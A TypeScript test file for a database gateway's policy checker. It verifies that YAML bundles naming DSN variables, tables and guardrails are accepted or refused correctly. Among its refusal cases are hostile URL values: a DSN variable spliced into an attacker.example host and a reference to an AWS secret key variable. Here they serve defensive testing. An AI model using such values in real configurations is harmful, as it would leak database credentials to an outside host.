// checkBundlePolicy — the "can a gateway enforce this?" answer the gateway acts
// on and the control plane runs before signing.

import { describe, expect, test } from "bun:test";
import { checkBundlePolicy } from "../../src/gateway/policy-check.ts";

const MAIN_ENV = "MIDPLANE_DSN_01J8Z6R0MAINAAAAAAAAAAAAAA";
const ANALYTICS_ENV = "MIDPLANE_DSN_01J8Z6R0ANALYTICSAAAAAAAAA";

// Shaped like the control plane's serializeMultiDbPolicyToYaml output.
function policy(opts: { mainUrl?: string; omit?: string; extraTop?: string; mainExtra?: string[] } = {}): string {
  const lines = ["databases:"];
  lines.push("  - name: main", `    url: ${opts.mainUrl ?? `\${${MAIN_ENV}}`}`);
  if (opts.omit !== "table_access") {
    lines.push("    table_access:", "      default: deny", "      tables:", "        public.orders: read");
  }
  if (opts.omit !== "guardrails") {
    lines.push("    guardrails:", "      block_unqualified_dml: true", "      block_ddl: true");
  }
  lines.push(...(opts.mainExtra ?? []));
  lines.push(
    "  - name: analytics",
    `    url: \${${ANALYTICS_ENV}}`,
    "    table_access:",
    "      default: read",
    "      tables: {}",
    "    guardrails:",
    "      block_unqualified_dml: true",
    "      block_ddl: true",
  );
  if (opts.extraTop) lines.push(opts.extraTop);
  return lines.join("\n") + "\n";
}

function reason(yaml: string): string {
  const r = checkBundlePolicy(yaml);
  if (r.ok) throw new Error("expected the policy to be refused");
  return r.reason;
}

describe("checkBundlePolicy", () => {
  test("a serializer-shaped policy resolves one spec per database, DSNs left to the gateway", () => {
    const r = checkBundlePolicy(policy());
    if (!r.ok) throw new Error(r.reason);
    expect(r.databases.map((d) => [d.spec.name, d.dsnEnv, d.spec.url])).toEqual([
      ["main", MAIN_ENV, ""],
      ["analytics", ANALYTICS_ENV, ""],
    ]);
    expect(r.databases[0]!.spec.tableAccess).toEqual({ default: "deny", tables: { "public.orders": "read" } });
  });

  test("approvals, masks and features pass through to the resolved spec", () => {
    const r = checkBundlePolicy(
      policy({
        mainExtra: [
          "    requires_features:",
          "      - column_masks",
          "      - write_approvals",
          "    column_masks:",
          "      public.users:",
          "        email: full-redact",
          "    approvals:",
          "      writes: true",
        ],
      }),
    );
    if (!r.ok) throw new Error(r.reason);
    const main = r.databases[0]!.spec;
    expect(main.columnMasks).toEqual({ "public.users": { email: "full-redact" } });
    expect(main.approvals).toEqual({ rowChanges: true, wholeTableWrites: true, schemaChanges: true });
  });

  describe("a bundle names a DSN variable, never a connection", () => {
    test.each([
      ["a literal DSN", "postgres://app:secret@db.internal:5432/app"],
      ["another env var", "${AWS_SECRET_ACCESS_KEY}"],
      ["a DSN variable spliced into a host of the bundle's choosing", `postgres://attacker.example/x?user=\${${MAIN_ENV}}`],
      ["two references", `\${${MAIN_ENV}}\${${ANALYTICS_ENV}}`],
      ["a lowercase lookalike", "${midplane_dsn_01abc}"],
    ])("refuses %s", (_label, url) => {
      expect(reason(policy({ mainUrl: url }))).toContain("url must be exactly");
    });
  });

  test("table_access and guardrails must be stated, never defaulted", () => {
    expect(reason(policy({ omit: "table_access" }))).toContain("no table_access");
    expect(reason(policy({ omit: "guardrails" }))).toContain("no guardrails");
  });

  test("a top-level section a databases: policy would ignore is refused", () => {
    expect(reason(policy({ extraTop: "approvals:\n  writes: true" }))).toContain("top level");
  });

  test("a feature this engine doesn't enforce is refused with the engine's own message", () => {
    const r = reason(policy({ mainExtra: ["    requires_features:", "      - row_estimate_limits"] }));
    expect(r).toContain("row_estimate_limits");
    expect(r).toContain("does not support");
  });

  test("schema errors from the engine parser surface as the reason", () => {
    expect(reason(policy({ mainExtra: ["    approvals:", "      writes: sometimes"] }))).toContain("schema error");
  });

  test("not a policy at all", () => {
    expect(reason("")).toContain("databases");
    expect(reason("databases: []\n")).toContain("at least one database");
    expect(reason("databases: [\n")).toContain("not valid YAML");
    expect(reason("- a\n- b\n")).toContain("mapping");
  });
});
